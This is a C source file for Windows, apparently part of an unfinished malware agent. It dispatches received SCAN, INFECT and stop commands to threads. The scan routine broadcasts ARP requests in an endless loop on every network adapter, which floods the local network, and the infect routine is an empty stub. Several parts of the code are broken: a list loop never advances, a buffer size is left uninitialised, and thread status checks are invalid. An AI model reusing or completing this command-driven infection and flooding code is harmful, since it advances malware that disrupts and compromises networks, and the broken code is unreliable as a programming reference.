#define _CRT_SECURE_NO_WARNINGS

#define HAVE_REMOTE
#define WPCAP
#include <pcap.h>
#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "packet.lib")

#include <ws2tcpip.h>
#include <iphlpapi.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

#include <Windows.h>
#include <malloc.h>
#include <wchar.h>

#include "commands.h"

typedef struct
{
	BYTE b1;
	BYTE b2;
	BYTE b3;
	BYTE b4;
	BYTE b5;
	BYTE b6;
} MAC_ADDR;

static HANDLE act_threads[ACTS_NUM];

static void build_packet(u_char* packet, PIP_ADAPTER_INFO adapter)
{
	ether_hdr* ether_header;
	arp_ether_ipv4* arp_header;
	
	ether_header = (ether_hdr*)packet;
	arp_header = (arp_ether_ipv4*)(packet + sizeof(ether_hdr));
	
	//ETHERNET LAYER
	ether_header->src_addr[0] = adapter->Address[0];
	ether_header->src_addr[1] = adapter->Address[1];
	ether_header->src_addr[2] = adapter->Address[2];
	ether_header->src_addr[3] = adapter->Address[3];
	ether_header->src_addr[4] = adapter->Address[4];
	ether_header->src_addr[5] = adapter->Address[5];
	
	memset(ether_header->dest_addr, 0xff, ETH_ALEN);

	ether_header->frame_type = htons(ETH_P_ARP);

	//NETWORK LAYER
	arp_header->htype = htons(ARP_HTYPE_ETHER);
	arp_header->ptype = htons(ARP_PTYPE_IPv4);
	arp_header->hlen = 6;
	arp_header->plen = 4;
	arp_header->op = htons(1);
	memcpy(arp_header->sha, ether_header->src_addr, ETH_ALEN);
	inet_pton(AF_INET, adapter->IpAddressList.IpAddress.String, &arp_header->spa);
	memset(arp_header->tha, 0, ETH_ALEN);
	//inet_pton(AF_INET, "192.168.8.254", &arp_header->tpa);
}

DWORD WINAPI scan(LPVOID lparam)
{
	pCommand command = (pCommand)lparam;
	PIP_ADAPTER_INFO pAdapterInfo = NULL;
	PIP_ADAPTER_INFO adp_p; //adapter pointer
	PIP_ADDR_STRING addr;
	ULONG outBufLen;

	GetAdaptersInfo(pAdapterInfo, &outBufLen);
	pAdapterInfo = (PIP_ADAPTER_INFO)malloc(outBufLen);
	if (!pAdapterInfo)
		return 1;
	GetAdaptersInfo(pAdapterInfo, &outBufLen);

	u_char packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
	pcap_t* fp;

	for (adp_p = pAdapterInfo; adp_p; adp_p = adp_p->Next)
	{
		char formatted_name[256] = "rpcap://\\Device\\NPF_";
		strcat(formatted_name, adp_p->AdapterName);
		for (addr = &adp_p->IpAddressList; addr; addr->Next)
		{
			fp = pcap_open(
				formatted_name,
				sizeof(packet),
				PCAP_OPENFLAG_PROMISCUOUS,
				1000,
				NULL,
				NULL
			);

			build_packet(packet, adp_p);
			while (1)
			{
				pcap_sendpacket(fp, packet, sizeof(packet));
			}
			break;
		}
	}
	return 0;
}

static DWORD WINAPI infect(LPVOID lparam)
{
	pCommand command = (pCommand)lparam;
	return 0;
}

void execute_command(pCommand command)
{
	
	switch (command->act)
	{
	case SCAN:
		//check if thread not active
		if (GetExitCodeThread(act_threads[SCAN], NULL) != STILL_ACTIVE)
		{
			act_threads[SCAN] = CreateThread(
				NULL,
				0,
				scan,
				(LPVOID)command,
				0,
				NULL
			);
		}
		break;
	case INFECT:
		//check if thread not active
		if (GetExitCodeThread(act_threads[INFECT], NULL) != STILL_ACTIVE)
		{
			act_threads[INFECT] = CreateThread(
				NULL,
				0,
				infect,
				(LPVOID)command,
				0,
				NULL
			);
		}
		break;
	case STOP_S:
		TerminateThread(act_threads[SCAN], 0);
		break;
	case STOP_I:
		TerminateThread(act_threads[INFECT], 0);
		break;
	case STOP_A:
		TerminateThread(act_threads[SCAN], 0);
		TerminateThread(act_threads[INFECT], 0);
		break;
	}
	
}